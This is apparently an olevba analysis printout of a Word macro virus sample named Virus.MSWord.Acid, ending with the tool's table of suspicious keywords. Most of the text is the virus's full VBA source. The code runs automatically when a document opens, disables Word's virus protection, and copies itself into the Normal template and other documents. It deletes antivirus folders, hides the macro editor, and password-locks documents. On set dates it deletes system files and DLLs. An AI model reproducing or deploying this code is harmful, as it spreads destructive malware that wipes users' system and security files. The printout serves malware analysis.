olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Acid
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Acid - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ACID.bas 
in file: Virus.MSWord.Acid - OLE stream: 'Macros/VBA/ACID'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  On Error GoTo ACID

  KillBAV

  Timer

  Application.Caption = "ULTRAS"

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For u = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(u).Name = "ACID" Then
      GlobalInstalled = Yes
    End If
  Next

  For a = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(a).Name = "ACID" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ACID", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ACID", Object:=wdOrganizerObjectProjectItems
      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If

  Application.DisplayAlerts = wdAlertsAll

ACID:
End Sub

Sub FileNew()
  Dialogs(wdDialogFileNew).Show
  ACID2
End Sub

Sub FileSave()
  ACID2
  ActiveDocument.Save
End Sub

Sub FileSaveAs()
  Dialogs(wdDialogFileSaveAs).Show
  ACID
End Sub

Sub FilePrint()
  ACID2
  Dialogs(wdDialogFilePrint).Show
End Sub

Sub FilePrintPreview()
  ACID
  ActiveDocument.PrintPreview
  ActiveDocument.Save
End Sub

Sub ToolsMacro()
Beep
Msgbox "Impossible open this function", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Word"
End Sub

Sub ViewVBCode()
Beep
Msgbox "Impossible open this function", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Word"
End Sub

Sub FileTemplates()

End Sub

Sub KillBAV()
  On Error GoTo ACID
  Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
  Kill "C:\Program Files\Command Software\F-PROT95\*.*"
  Kill "C:\Program Files\McAfee\VirusScan\*.*"
  Kill "C:\Program Files\Norton AntiVirus\*.*"
  Kill "C:\Program Files\FindVirus\*.*"
  Kill "C:\f-macro\*.*"
  Kill "C:\Tbavw95\*.*"
ACID:
End Sub

Sub Timer()
  On Error GoTo ACID
If Day(Now()) = 1 Then
  Beep
  Msgbox "You Infected WM97.ACID by ULTRAS", vbCritical + vbOKOnly + vbDefaultButton1, "ULTRAS"
  ACID
  ActiveDocument.Password = "ACID BY ULTRAS"
  ActiveDocument.Save
End If

If Day(Now()) = 9 Then
  Beep
  Msgbox "You Infected WM97.ACID by ULTRAS", vbCritical + vbOKOnly + vbDefaultButton1, "ULTRAS"
  ACID2
  ActiveDocument.Password = "ULTRAS"
  ActiveDocument.Save
End If

If Day(Now()) = 17 Then
  ACID2
  Kill "C:\Autoexec.bat"
  Kill "C:\Config.sys"
  Kill "C:\Command.com"
End If

If Day(Now()) = 25 Then
  ACID
  Kill "C:\Windows\*.ini"
  Kill "C:\Windows\System\*.dll"
End If
ACID:
End Sub

Sub ACID()
On Error GoTo ACID
 Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
  With ULTRAS
   .InsertBefore "ACID BY ULTRAS"
   .Font.Name = "Impact"
   .Font.Size = 65
   .Font.ColorIndex = 2
   .Font.Animation = 2
  End With
ACID:
End Sub

Sub ACID2()
On Error GoTo ACID
 Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
  With ULTRAS
   .InsertBefore "ULTRAS"
   .Font.Name = "Impact"
   .Font.Size = 140
   .Font.ColorIndex = 9
   .Font.Animation = 6
   .Font.Shadow = 1
  End With
ACID:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

